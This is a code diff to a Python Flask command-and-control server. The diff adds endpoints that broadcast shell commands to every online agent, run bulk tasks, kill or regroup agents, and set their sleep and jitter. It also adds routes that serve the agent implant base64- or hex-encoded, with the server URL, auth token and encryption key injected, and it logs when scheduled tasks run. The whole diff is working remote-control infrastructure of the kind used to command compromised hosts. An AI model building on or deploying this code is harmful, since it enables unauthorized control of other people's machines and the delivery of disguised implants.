@@ -242,9 +242,20 @@ def init_db():
         last_run TEXT,
         next_run TEXT,
         enabled INTEGER DEFAULT 1,
+        exec_count INTEGER DEFAULT 0,
+        last_exec_log TEXT,
         created_at TEXT DEFAULT (datetime('now'))
     );
     """)
+    # Add missing columns if they don't exist
+    try:
+        db.execute("ALTER TABLE scheduled_tasks ADD COLUMN exec_count INTEGER DEFAULT 0")
+    except:
+        pass
+    try:
+        db.execute("ALTER TABLE scheduled_tasks ADD COLUMN last_exec_log TEXT")
+    except:
+        pass
     # Default admin: admin / admin (change on first login)
     existing = db.execute("SELECT id FROM users WHERE username='admin'").fetchone()
     if not existing:
@@ -2520,6 +2531,156 @@ def server_time():
         "uptime_seconds": uptime
     })
 
+@app.route("/api/server/health")
+@login_required
+def server_health():
+    """Return system health metrics: CPU, RAM, Disk usage."""
+    import psutil
+    try:
+        cpu = psutil.cpu_percent(interval=0.5)
+        ram = psutil.virtual_memory().percent
+        disk = psutil.disk_usage('/').percent
+        return jsonify({
+            "cpu": round(cpu, 1),
+            "ram": round(ram, 1),
+            "disk": round(disk, 1)
+        })
+    except Exception as e:
+        # Fallback if psutil not available
+        return jsonify({
+            "cpu": 0,
+            "ram": 0,
+            "disk": 0,
+            "error": str(e)
+        })
+
+@app.route("/api/agents/broadcast", methods=["POST"])
+@login_required
+def broadcast_command():
+    """Send command to all online agents."""
+    data = request.get_json(silent=True) or {}
+    command = data.get("command", "").strip()
+    if not command:
+        return jsonify({"error": "No command provided"}), 400
+    
+    db = get_db()
+    agents = db.execute("SELECT id FROM agents WHERE is_alive=1").fetchall()
+    count = 0
+    for agent in agents:
+        db.execute(
+            "INSERT INTO tasks (agent_id, task_type, command, status, created_at) VALUES (?, 'shell', ?, 'pending', ?)",
+            (agent['id'], command, datetime.now().isoformat())
+        )
+        count += 1
+    db.commit()
+    db.close()
+    
+    log_event("broadcast", f"Command '{command[:30]}...' sent to {count} agents")
+    return jsonify({"status": "ok", "count": count})
+
+@app.route("/api/agents/wake-offline", methods=["POST"])
+@login_required
+def wake_offline_agents():
+    """Send wake/checkin command to all offline agents."""
+    db = get_db()
+    agents = db.execute("SELECT id FROM agents WHERE is_alive=0").fetchall()
+    count = 0
+    for agent in agents:
+        db.execute(
+            "INSERT INTO tasks (agent_id, task_type, command, status, created_at) VALUES (?, 'shell', ?, 'pending', ?)",
+            (agent['id'], 'checkin', datetime.now().isoformat())
+        )
+        count += 1
+    db.commit()
+    db.close()
+    return jsonify({"status": "ok", "count": count})
+
+@app.route("/api/agents/kill-offline", methods=["POST"])
+@login_required
+def kill_offline_agents():
+    """Remove all offline agents."""
+    db = get_db()
+    result = db.execute("SELECT id FROM agents WHERE is_alive=0").fetchall()
+    count = len(result)
+    for agent in result:
+        db.execute("DELETE FROM tasks WHERE agent_id=?", (agent['id'],))
+        db.execute("DELETE FROM agents WHERE id=?", (agent['id'],))
+    db.commit()
+    db.close()
+    log_event("bulk_remove", f"Removed {count} offline agents")
+    return jsonify({"status": "ok", "count": count})
+
+@app.route("/api/groups")
+@login_required
+def get_groups():
+    """Get all groups with agent counts."""
+    db = get_db()
+    groups = db.execute("SELECT DISTINCT COALESCE(group_name, 'default') as grp, COUNT(*) as cnt FROM agents GROUP BY group_name").fetchall()
+    result = {g['grp']: g['cnt'] for g in groups}
+    db.close()
+    return jsonify({"groups": result})
+
+@app.route("/api/groups", methods=["POST"])
+@login_required
+def create_group_endpoint():
+    """Create a new group (just acknowledge, groups are virtual)."""
+    data = request.get_json(silent=True) or {}
+    name = data.get("name", "").strip()
+    if not name:
+        return jsonify({"error": "No group name"}), 400
+    return jsonify({"status": "ok", "group": name})
+
+@app.route("/api/agents/bulk-sleep", methods=["POST"])
+@login_required
+def bulk_set_sleep():
+    """Set sleep interval for multiple agents."""
+    data = request.get_json(silent=True) or {}
+    agents = data.get("agents", [])
+    sleep = data.get("sleep", 5)
+    
+    db = get_db()
+    count = 0
+    for agent_id in agents:
+        db.execute("UPDATE agents SET sleep_interval=? WHERE id=?", (sleep, agent_id))
+        count += 1
+    db.commit()
+    db.close()
+    return jsonify({"status": "ok", "count": count})
+
+@app.route("/api/agents/bulk-jitter", methods=["POST"])
+@login_required
+def bulk_set_jitter():
+    """Set jitter for multiple agents."""
+    data = request.get_json(silent=True) or {}
+    agents = data.get("agents", [])
+    jitter = data.get("jitter", 0)
+    
+    db = get_db()
+    count = 0
+    for agent_id in agents:
+        db.execute("UPDATE agents SET jitter=? WHERE id=?", (jitter, agent_id))
+        count += 1
+    db.commit()
+    db.close()
+    return jsonify({"status": "ok", "count": count})
+
+@app.route("/api/agents/bulk-group", methods=["POST"])
+@login_required
+def bulk_set_group():
+    """Assign multiple agents to a group."""
+    data = request.get_json(silent=True) or {}
+    agents = data.get("agents", [])
+    group = data.get("group", "")
+    
+    db = get_db()
+    count = 0
+    for agent_id in agents:
+        db.execute("UPDATE agents SET group_name=? WHERE id=?", (group, agent_id))
+        count += 1
+    db.commit()
+    db.close()
+    return jsonify({"status": "ok", "count": count})
+
 # ──────────────────────── AGENT FILE SERVING ────────────────────────
 
 @app.route("/agents/<path:filename>")
@@ -2546,6 +2707,51 @@ def serve_agent(filename):
         content = content.replace('ENC_KEY    = os.environ.get("ENC_KEY",    "")',
                                    f'ENC_KEY    = os.environ.get("ENC_KEY",    "{enc_key}")')
     return Response(content, mimetype="text/plain")
+
+
+@app.route("/agents/<path:filename>_b64.txt")
+def serve_agent_b64(filename):
+    """Serve base64 encoded agent."""
+    agents_dir = BASE_DIR / "src" / "agents"
+    fpath = agents_dir / filename
+    if not (fpath.exists() and fpath.is_file()):
+        return "Not found", 404
+    content = fpath.read_text()
+    server_url = _get_public_url() or f"{request.scheme}://{request.host}"
+    content = content.replace("http://CHANGE_ME:443", server_url)
+    token = get_config("agent_token")
+    if token:
+        content = content.replace('AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")',
+                                   f'AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "{token}")')
+    enc_key = get_config("encryption_key")
+    if enc_key:
+        content = content.replace('ENC_KEY    = os.environ.get("ENC_KEY",    "")',
+                                   f'ENC_KEY    = os.environ.get("ENC_KEY",    "{enc_key}")')
+    import base64
+    encoded = base64.b64encode(content.encode()).decode()
+    return Response(encoded, mimetype="text/plain")
+
+
+@app.route("/agents/<path:filename>_hex.txt")
+def serve_agent_hex(filename):
+    """Serve hex encoded agent."""
+    agents_dir = BASE_DIR / "src" / "agents"
+    fpath = agents_dir / filename
+    if not (fpath.exists() and fpath.is_file()):
+        return "Not found", 404
+    content = fpath.read_text()
+    server_url = _get_public_url() or f"{request.scheme}://{request.host}"
+    content = content.replace("http://CHANGE_ME:443", server_url)
+    token = get_config("agent_token")
+    if token:
+        content = content.replace('AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")',
+                                   f'AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "{token}")')
+    enc_key = get_config("encryption_key")
+    if enc_key:
+        content = content.replace('ENC_KEY    = os.environ.get("ENC_KEY",    "")',
+                                   f'ENC_KEY    = os.environ.get("ENC_KEY",    "{enc_key}")')
+    encoded = content.encode().hex()
+    return Response(encoded, mimetype="text/plain")
 
 
 @app.route("/package/c2agent.tar.gz")
@@ -2832,6 +3038,87 @@ def broadcast_task():
         db.close()
         log_event("broadcast", f"{task_type}: {payload[:80]} -> {len(agents)} agents ({target})")
         return jsonify({"status": "ok", "count": len(agents)})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route("/api/task/bulk", methods=["POST"])
+@login_required
+def bulk_task():
+    """Execute task on specific list of agents."""
+    data = request.get_json(silent=True) or {}
+    agent_ids = data.get("agents", [])
+    task_type = data.get("type", "cmd")
+    payload = data.get("payload", "")
+    
+    if not agent_ids or not payload:
+        return jsonify({"error": "missing agents or payload"}), 400
+    
+    task_type, payload = _expand_shortcut(task_type, payload)
+    
+    try:
+        db = get_db()
+        count = 0
+        for agent_id in agent_ids:
+            task_id = str(uuid.uuid4())
+            db.execute("INSERT INTO tasks (id, agent_id, task_type, payload) VALUES (?, ?, ?, ?)",
+                       (task_id, agent_id, task_type, payload))
+            count += 1
+        db.commit()
+        db.close()
+        log_event("bulk_task", f"{task_type}: {payload[:50]} -> {count} agents")
+        return jsonify({"status": "ok", "count": count})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route("/api/agents/bulk-kill", methods=["POST"])
+@login_required
+def bulk_kill():
+    """Kill agents (remove from database)."""
+    data = request.get_json(silent=True) or {}
+    agent_ids = data.get("agents", [])
+    
+    if not agent_ids:
+        return jsonify({"error": "no agents specified"}), 400
+    
+    try:
+        db = get_db()
+        count = 0
+        for agent_id in agent_ids:
+            db.execute("DELETE FROM agents WHERE id=?", (agent_id,))
+            db.execute("DELETE FROM tasks WHERE agent_id=?", (agent_id,))
+            count += 1
+        db.commit()
+        db.close()
+        log_event("bulk_kill", f"Removed {count} agents")
+        return jsonify({"status": "ok", "count": count})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route("/api/agents/bulk-tag", methods=["POST"])
+@login_required
+def bulk_tag():
+    """Tag multiple agents."""
+    data = request.get_json(silent=True) or {}
+    agent_ids = data.get("agents", [])
+    tag = data.get("tag", "")
+    
+    if not agent_ids:
+        return jsonify({"error": "no agents specified"}), 400
+    
+    try:
+        db = get_db()
+        count = 0
+        for agent_id in agent_ids:
+            agent = db.execute("SELECT tags FROM agents WHERE id=?", (agent_id,)).fetchone()
+            if agent:
+                tags = json.loads(agent["tags"] or "[]")
+                if tag and tag not in tags:
+                    tags.append(tag)
+                db.execute("UPDATE agents SET tags=? WHERE id=?", (json.dumps(tags), agent_id))
+                count += 1
+        db.commit()
+        db.close()
+        return jsonify({"status": "ok", "count": count})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
@@ -4190,6 +4477,16 @@ def list_scheduled():
     db.close()
     return jsonify([dict(r) for r in rows])
 
+@app.route("/api/scheduled/<sid>")
+@login_required
+def get_scheduled(sid):
+    db = get_db()
+    row = db.execute("SELECT * FROM scheduled_tasks WHERE id=?", (sid,)).fetchone()
+    db.close()
+    if not row:
+        return jsonify({"error": "not found"}), 404
+    return jsonify(dict(row))
+
 @app.route("/api/scheduled/create", methods=["POST"])
 @login_required
 def create_scheduled():
@@ -4536,6 +4833,18 @@ def scheduled_task_runner():
                     agents = db.execute("SELECT id FROM agents WHERE is_alive=1 AND group_name=?",
                                         (target,)).fetchall()
                 task_type, payload = _expand_shortcut(st["task_type"], st["payload"])
+                
+                # Track execution
+                exec_log = {
+                    "scheduled_id": st["id"],
+                    "name": st["name"],
+                    "task_type": task_type,
+                    "payload": payload[:100],
+                    "target": target,
+                    "agents_count": len(agents),
+                    "executed_at": now_str
+                }
+                
                 for a in agents:
                     tid = str(uuid.uuid4())
                     db.execute("INSERT INTO tasks (id,agent_id,task_type,payload) VALUES (?,?,?,?)",
@@ -4543,13 +4852,15 @@ def scheduled_task_runner():
 
                 interval = st["interval_sec"]
                 next_run = (datetime.now() + timedelta(seconds=interval)).strftime("%Y-%m-%d %H:%M:%S")
-                db.execute("UPDATE scheduled_tasks SET last_run=?, next_run=? WHERE id=?",
-                           (now_str, next_run, st["id"]))
+                
+                # Update execution count and last exec log
+                db.execute("UPDATE scheduled_tasks SET last_run=?, next_run=?, exec_count=COALESCE(exec_count,0)+1, last_exec_log=? WHERE id=?",
+                           (now_str, next_run, json.dumps(exec_log), st["id"]))
                 log_event("scheduled_fired", f"{st['name']} -> {len(agents)} agents")
             db.commit()
             db.close()
-        except Exception:
-            pass
+        except Exception as e:
+            log_event("scheduled_error", str(e))
         time.sleep(30)
 
 threading.Thread(target=health_check_loop, daemon=True).start()
